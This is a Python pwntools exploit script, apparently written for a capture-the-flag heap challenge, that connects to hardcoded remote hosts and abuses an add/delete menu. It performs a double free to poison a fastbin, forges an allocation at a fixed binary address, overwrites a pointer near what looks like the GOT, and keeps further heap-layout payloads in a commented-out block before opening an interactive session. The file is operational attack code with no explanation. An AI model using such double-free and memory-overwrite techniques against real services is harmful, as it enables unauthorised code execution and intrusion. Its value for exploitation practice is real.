from pwn import *

HOST = "39.96.9.148"
PORT = 1234
REMOTE = 0
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('13.125.131.113',PORT)
def add(index, size, dat):
  s.recvuntil("2 delete")
  s.sendline("1")
  s.recvuntil(":")
  s.sendline(str(index))
  s.recvuntil(":")
  s.sendline(str(size))
  s.recvuntil(":")
  s.send(dat)

def delete(index):
  s.recvuntil("2 delete")
  s.sendline("2")
  s.recvuntil(":")
  s.sendline(str(index))


raw_input()
add(0, 0x38, "ABCD\n")
add(1, 0x38, "ABCD\n")
delete(0)
delete(1)
delete(0)
add(0, 0x38, p64(0x602082-0x8)+"\n")
add(1, 0x38, "ABCD\n")
add(2, 0x38, "ABCD"+"\n")
for i in range(4,11-2):
  add(i, 0x100, "1234\n")
add(2, 0x38, "A"*0x6+p64(0xdeadbeef)*2+ p64(0x602020))
'''
add(2, 0x68, "ABC"+p64(0x06020C0+0x20)+"\x00"*0x10+p64(0x21)+"\x00"*0x18+p64(0xff7)+"\n")
add(5, 0x20, p64(0x71)*2+"\n")
add(5, 0x20, "ABCD\n")
delete(0)
add(8, 0x100, "\x00"*0x10+p64(0xff7)*2+"\n")
add(9, 0x100, "ABCD\n")
add(0,0x10, "\x00"*8+"\n")
delete(5)
delete(8)
add(5, 0x68, "\x00"*0x40+p64(0x101)*2+p64(0x602110-0x10)*2+'\n')
#add(9, 0x100, "1234\n")
'''
s.interactive()

